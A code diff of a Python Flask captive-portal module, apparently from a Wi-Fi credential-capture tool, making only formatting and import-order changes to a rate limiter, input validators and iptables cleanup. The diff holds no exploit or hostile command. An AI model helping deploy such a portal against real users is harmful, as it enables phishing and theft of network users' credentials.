@@ -8,26 +8,28 @@ Routes live in :mod:`portal.routes` and are mounted as a ``Blueprint`` here.
 Security headers / cookies are configured explicitly in ``__init__``.
 """
 
-import re
-import threading
 import logging
+import re
 import secrets
+import threading
+from collections.abc import Callable
 from functools import wraps
 from time import time
-from typing import Optional, Callable
 
 from flask import (
-    Flask, request, make_response,
+    Flask,
+    make_response,
+    request,
 )
 
-from utils.logger import CredentialLogger
-from core.otp_service import OTPServiceInterface
-from core.network import NetworkConfig, flush_iptables, backup_iptables, restore_iptables
-from core.models import AppConfig
 from core.events import EventBus
-from core.paths import PORTAL_TEMPLATES_DIR, PORTAL_STATIC_DIR
-from portal.routes import build_portal_blueprint
+from core.models import AppConfig
+from core.network import NetworkConfig, flush_iptables, restore_iptables
+from core.otp_service import OTPServiceInterface
+from core.paths import PORTAL_STATIC_DIR, PORTAL_TEMPLATES_DIR
 from portal.admin import build_admin_blueprint
+from portal.routes import build_portal_blueprint
+from utils.logger import CredentialLogger
 
 logger = logging.getLogger("wimirage")
 
@@ -42,23 +44,23 @@ def rate_limit(max_requests: int = 5, window_seconds: int = 60) -> Callable:
         (Flask's threaded dev server + any IO-thread overlap was racing
         on the bare dict; see ``test_captive_portal.py::TestRateLimit
         ::test_concurrent_decorator_is_thread_safe``). When the dict
-        grows past ``_EVICTION_THRESHOLD`` unique IPs, oldest entries are
+        grows past ``eviction_threshold`` unique IPs, oldest entries are
         evicted so long-running portals can't be DoS'd via unbounded
         key population. If you scale Flask across workers, swap this for
         a Redis-backed implementation.
     """
+
     def decorator(f: Callable) -> Callable:
         _requests: dict[str, list[float]] = {}
         _lock = threading.Lock()
-        _EVICTION_THRESHOLD = 4096
+        eviction_threshold = 4096
 
         def _evict_if_needed(now: float) -> None:
-            if len(_requests) < _EVICTION_THRESHOLD:
+            if len(_requests) < eviction_threshold:
                 return
             # drop keys with no recent requests
             stale = [
-                ip for ip, hits in _requests.items()
-                if not hits or now - hits[-1] >= window_seconds
+                ip for ip, hits in _requests.items() if not hits or now - hits[-1] >= window_seconds
             ]
             for ip in stale:
                 _requests.pop(ip, None)
@@ -78,12 +80,12 @@ def rate_limit(max_requests: int = 5, window_seconds: int = 60) -> Callable:
                 if len(bucket) >= max_requests:
                     # Plain-text 429 — render_template() needs an app_context,
                     # which isn't guaranteed inside the decorator.
-                    return make_response(
-                        "Too many requests. Please wait.", 429
-                    )
+                    return make_response("Too many requests. Please wait.", 429)
                 bucket.append(now)
             return f(*args, **kwargs)
+
         return wrapped
+
     return decorator
 
 
@@ -91,14 +93,14 @@ def validate_phone(phone: str) -> bool:
     """Return True if ``phone`` looks like an E.164-compliant number."""
     if not isinstance(phone, str) or not phone:
         return False
-    return bool(re.match(r'^\+?[0-9]{7,15}$', phone))
+    return bool(re.match(r"^\+?[0-9]{7,15}$", phone))
 
 
 def validate_email(email: str) -> bool:
     """Return True if ``email`` matches a basic RFC-5322 shape."""
     if not isinstance(email, str) or not email:
         return False
-    return bool(re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email))
+    return bool(re.match(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$", email))
 
 
 class CaptivePortal:
@@ -134,14 +136,20 @@ class CaptivePortal:
         ),
     }
 
+    _atexit_registered: bool = False
+
     DEFAULT_PORTAL_PORT = 80
     MAX_CONTENT_LENGTH = 1024 * 1024  # 1MB hard cap on POST bodies (DoS guard)
 
-    def __init__(self, config: AppConfig, otp_service: OTPServiceInterface | None = None,
-                 network_config: NetworkConfig | None = None,
-                 event_bus: EventBus | None = None,
-                 logger_instance: CredentialLogger | None = None,
-                 ssl_context: Optional = None) -> None:
+    def __init__(
+        self,
+        config: AppConfig,
+        otp_service: OTPServiceInterface | None = None,
+        network_config: NetworkConfig | None = None,
+        event_bus: EventBus | None = None,
+        logger_instance: CredentialLogger | None = None,
+        ssl_context: object | None = None,
+    ) -> None:
         self.config = config
         self.otp_service = otp_service
         self.network_config = network_config
@@ -215,7 +223,8 @@ class CaptivePortal:
                 try:
                     logger.error(
                         "atexit iptables flush+restore failed: %s: %s",
-                        type(e).__name__, e,
+                        type(e).__name__,
+                        e,
                     )
                 except (ValueError, OSError):
                     # Stream already closed (typical in pytest runs).
@@ -237,7 +246,8 @@ class CaptivePortal:
             except Exception as e:
                 logger.error(
                     "NetworkConfig.cleanup failed: %s: %s; falling back.",
-                    type(e).__name__, e,
+                    type(e).__name__,
+                    e,
                 )
         # Fallback path — flush_iptables is imported into this module's
         # namespace at the top so test monkeypatching ``core.captive_portal
@@ -288,12 +298,12 @@ class CaptivePortal:
         }
         if self.ssl_context is not None:
             run_kwargs["ssl_context"] = self.ssl_context
-        self._server_thread = threading.Thread(
-            target=self.app.run, kwargs=run_kwargs, daemon=True
-        )
+        self._server_thread = threading.Thread(target=self.app.run, kwargs=run_kwargs, daemon=True)
         self._server_thread.start()
         scheme = "https" if self.ssl_context else "http"
-        logger.info(f"Captive portal running at {scheme}://{self.config.gateway}:{self.config.portal_port}")
+        logger.info(
+            f"Captive portal running at {scheme}://{self.config.gateway}:{self.config.portal_port}"
+        )
 
     def stop(self) -> None:
         """Signal-stop the portal. Flask's dev server cannot be cleanly terminated; this is a no-op stub."""
